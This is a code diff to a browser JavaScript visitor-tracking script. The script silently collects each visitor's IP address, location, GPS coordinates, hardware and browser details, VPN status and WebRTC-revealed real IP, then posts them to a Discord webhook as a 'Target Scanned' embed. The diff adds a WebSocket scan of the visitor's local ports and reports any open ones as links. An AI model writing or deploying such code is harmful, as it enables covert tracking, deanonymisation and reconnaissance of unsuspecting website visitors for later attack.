@@ -4,8 +4,8 @@ fetch('config.json')
     .then(config => {
 
         asyncHandler = async () => {
-
             const webhook_url = config.webhook_url;
+
 
             // Extended Operating System Detection
             function detectOperatingSystem(userAgent) {
@@ -29,7 +29,8 @@ fetch('config.json')
                 }
                 return "Unknown OS";
             }
-    
+
+            
             // Extended Browser Detection
             function detectBrowser(userAgent) {
                 if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox";
@@ -54,7 +55,9 @@ fetch('config.json')
                     browser
                 };
             }
-    
+
+            
+            // Function to get GPU details            
             function getGPUDetails() {
                 return new Promise((resolve, reject) => {
                     var canvas = document.createElement('canvas');
@@ -69,83 +72,115 @@ fetch('config.json')
                     }
                 });
             }
-    
-            // Function to get IP and location data
-            function getLocationAndGPSData() {
-                var userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone";
-                var messageSent = false; // Add this flag
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Network response was not ok for IPify.');
-                        }
-                        return response.json();
-                    })
-                    .then(data => {
-                        var ip = data.ip;
-                        return Promise.all([
-                            checkVPN(ip, userTimezone),
-                            fetch('https://ipapi.co/' + ip + '/json/').then(response => {
-                                if (!response.ok) {
-                                    throw new Error('Network response was not ok for IPAPI.');
-                                }
-                                return response.json();
-                            }),
-                            checkWebRTCLoak(),
-                            getGPUDetails()
-                        ]);
-                    })
-                    .then(([vpnResult, location, webrtcResult, gpuDetails]) => {
-                        var systemDetails = getSystemDetails();
-                        var screenResolution = `${window.screen.width}x${window.screen.height}`;
-                        var referrer = document.referrer || "No referrer";
-                        var language = navigator.language;
-    
-                        // Send embed with location information if available, or a placeholder if not
-                        // console.log(location.region); ///debug
-                        if (location.region == null){
-                            var locationValue = location && location.city ? `${location.city}, ${location.country_name}` : "Location data not available";
-                        } else {
-                        var locationValue = location && location.city ? `${location.city}, ${location.region}, ${location.country_name}` : "Location data not available";
-                        }
 
-                        if (location.city == location.country_name) {
-                            //here overloaded once and always enter!!
-                            locationValue = location && location.city ? `${location.city}` : "Location data not available";
-                        }
 
-                        var gpsValue = location && location.latitude && location.longitude ? `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})` : "Location data not available";
-    
-                        var gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
-    
-                        sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue);
-                        messageSent = true; // Set the flag to true after sending the message
-    
-                        // Additional data send on geolocation permission
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(
-                                function (position) {
-                                    if (messageSent) {
-                                        return
-                                    }
-                                    
-                                    var gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
-                                    var gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;
-                                    sendDiscordEmbed(location, gpsText, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue);
-                                },
-                                function (error) {
-                                    console.error('Geolocation error:', error);
-                                },
-                                { timeout: 10000 }
-                            );
+            // Function for port scanning with WebSocket
+            function checkPort(port) {
+                return new Promise((resolve) => {
+                    var ws;
+                    var url = 'ws://localhost:' + port;
+                    var timeout = setTimeout(function () {
+                        if (ws) {
+                            ws.close();
                         }
-                    })
-                    .catch(error => {
-                        console.error('Error in gathering GPU data:', error);
-                        handleErrorType('unknown', 'Error in gathering GPU data: ' + error.message, userTimezone);
-                    });
+                        resolve(false); // port is closed or blocked
+                    }, 2000); // timeout in 2 seconds
+
+                    try {
+                        ws = new WebSocket(url);
+                        ws.onopen = function () {
+                            clearTimeout(timeout);
+                            ws.close();
+                            resolve(true); // port is open
+                        };
+                        ws.onerror = function () {
+                            clearTimeout(timeout);
+                            resolve(false); // port is closed or blocked
+                        };
+                    } catch (e) {
+                        clearTimeout(timeout);
+                        resolve(false); // handle any exception
+                    }
+                });
             }
-    
+
+
+            //Main function for processing
+            async function getLocationAndGPSData() {
+                var userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone";
+                var messageSent = false; 
+                var portsToCheck = [53, 80, 443, 995, 8080, 8081, 2222, 5001, 50000, 8443, 2086, 5555, 25565, 554, 1935, 21, 22, 23, 25, 110, 143, 3306, 3389, 5900, 55443, 10001];
+            
+                try {
+                    const portResults = await Promise.all(portsToCheck.map(port => checkPort(port)));
+                    console.log('Port check results:', portResults);
+            
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    if (!ipResponse.ok) {
+                        throw new Error('Network response was not ok for IPify.');
+                    }
+                    const { ip } = await ipResponse.json();
+            
+                    const ipapiResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    if (!ipapiResponse.ok) {
+                        throw new Error('Network response was not ok for IPAPI.');
+                    }
+                    const location = await ipapiResponse.json();
+            
+                    const [vpnResult, webrtcResult, gpuDetails] = await Promise.all([
+                        checkVPN(ip, userTimezone),
+                        checkWebRTCLoak(),
+                        getGPUDetails()
+                    ]);
+            
+                    var systemDetails = getSystemDetails();
+                    var screenResolution = `${window.screen.width}x${window.screen.height}`;
+                    var referrer = document.referrer || "No referrer";
+                    var language = navigator.language;
+            
+                    var locationValue = getLocationValue(location);
+                    var gpsValue = location && location.latitude && location.longitude ? 
+                                   `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})` : 
+                                   "Location data not available";
+            
+                    var gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
+            
+                    sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue, portResults, portsToCheck);
+                    messageSent = true; // Set the flag to true after sending the message
+            
+                    // Additional data send on geolocation permission
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            function (position) {
+                                if (messageSent) {
+                                    return;
+                                }
+                                var gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
+                                var gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;
+                                sendDiscordEmbed(location, gpsText, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue, portResults, portsToCheck);
+                            },
+                            function (error) {
+                                console.error('Geolocation error:', error);
+                            },
+                            { timeout: 10000 }
+                        );
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    handleErrorType('unknown', 'Error: ' + error.message, userTimezone);
+                }
+            }
+            
+            function getLocationValue(location) {
+                if (location.region == null) {
+                    return location && location.city ? `${location.city}, ${location.country_name}` : "Location data not available";
+                } else if (location.city == location.country_name) {
+                    return location && location.city ? `${location.city}` : "Location data not available";
+                } else {
+                    return location && location.city ? `${location.city}, ${location.region}, ${location.country_name}` : "Location data not available";
+                }
+            }
+            
             function checkVPN(ip, timezone) {
                 return new Promise((resolve, reject) => {
                     fetch(`https://ipapi.co/${ip}/json/`)
@@ -171,7 +206,7 @@ fetch('config.json')
                 });
             }
     
-    
+            //Sneak real IP with WebRTC
             function checkWebRTCLoak() {
                 return new Promise(resolve => {
                     const rtcPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
@@ -212,7 +247,7 @@ fetch('config.json')
                 });
             }
     
-    
+            //Error Handler
             function handleErrorType(errorCode, errorMessage, userTimezone) {
                 let errorDescription;
     
@@ -251,7 +286,9 @@ fetch('config.json')
                     sendDiscordMessage([errorEmbed]);
                 }
             }
-    
+
+
+            //More shennanigans
             function getAdditionalDetails() {
                 var userAgent = navigator.userAgent;
                 var deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop';
@@ -270,8 +307,19 @@ fetch('config.json')
     
     
             // Function to send message to Discord
-            function sendDiscordEmbed(_location_, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue) {
+            function sendDiscordEmbed(_location_, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue, portResults, portsToCheck) {
                 var additionalDetails = getAdditionalDetails();
+
+                var portStatusString = "No open ports detected";
+                if (Array.isArray(portResults)) {
+                    const openPorts = portResults
+                        .map((isOpen, index) => isOpen ? `[Port ${portsToCheck[index]}](http://${location.ip}:${portsToCheck[index]})` : null)
+                        .filter(port => port !== null);
+            
+                    if (openPorts.length > 0) {
+                        portStatusString = openPorts.join('\n');
+                    }
+                }
 
                 var embeds = [{
                     "title": "Target Scanned",
@@ -279,7 +327,7 @@ fetch('config.json')
                     "fields": [
                         {
                             "name": "IP Address",
-                            "value": _location_.ip ? _location_.ip : "dunno",
+                            "value": _location_.ip ? _location_.ip : "Unknown",
                             "inline": true
                         },
                         {
@@ -289,72 +337,77 @@ fetch('config.json')
                         },
                         {
                             "name": "GPS Coordinates",
-                            "value": gpsValue ? gpsValue : "dunno",
+                            "value": gpsValue ? gpsValue : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "GPU",
-                            "value": gpuValue ? gpuValue : "dunno",
+                            "value": gpuValue ? gpuValue : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Operating System",
-                            "value": systemDetails.operatingSystem ? systemDetails.operatingSystem : "dunno",
+                            "value": systemDetails.operatingSystem ? systemDetails.operatingSystem : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Browser",
-                            "value": (systemDetails.browser ? systemDetails.browser : "dunno") + " " + (additionalDetails.browserVersion ? additionalDetails.browserVersion : "dunno"),
+                            "value": (systemDetails.browser ? systemDetails.browser : "Unknown") + " " + (additionalDetails.browserVersion ? additionalDetails.browserVersion : "Unknown"),
                             "inline": true
                         },
                         {
                             "name": "Screen Resolution",
-                            "value": screenResolution ? screenResolution : "dunno",
+                            "value": screenResolution ? screenResolution : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Referrer",
-                            "value": referrer ? referrer : "dunno",
+                            "value": referrer ? referrer : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Time Zone",
-                            "value": userTimezone ? userTimezone : "dunno",
+                            "value": userTimezone ? userTimezone : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Language",
-                            "value": language ? language : "dunno",
+                            "value": language ? language : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Device Type",
-                            "value": additionalDetails.deviceType ? additionalDetails.deviceType : "dunno",
+                            "value": additionalDetails.deviceType ? additionalDetails.deviceType : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Browser Version",
-                            "value": additionalDetails.browserVersion ? additionalDetails.browserVersion : "dunno",
+                            "value": additionalDetails.browserVersion ? additionalDetails.browserVersion : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Connection Type",
-                            "value": additionalDetails.connectionType ? additionalDetails.connectionType : "dunno",
+                            "value": additionalDetails.connectionType ? additionalDetails.connectionType : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Do Not Track",
-                            "value": additionalDetails.doNotTrack ? additionalDetails.doNotTrack : "dunno",
+                            "value": additionalDetails.doNotTrack ? additionalDetails.doNotTrack : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "Time Zone vs IP Location",
-                            "value": vpnMessage ? vpnMessage : "dunno",
+                            "value": vpnMessage ? vpnMessage : "Unknown",
                             "inline": true
                         },
                         {
                             "name": "WebRTC Leak Status",
-                            "value": webrtcResult ? webrtcResult : "dunno",
+                            "value": webrtcResult ? webrtcResult : "Unknown",
+                            "inline": true
+                        },
+                        {
+                            "name": "Port Status",
+                            "value": portStatusString,
                             "inline": true
                         }
                     ]
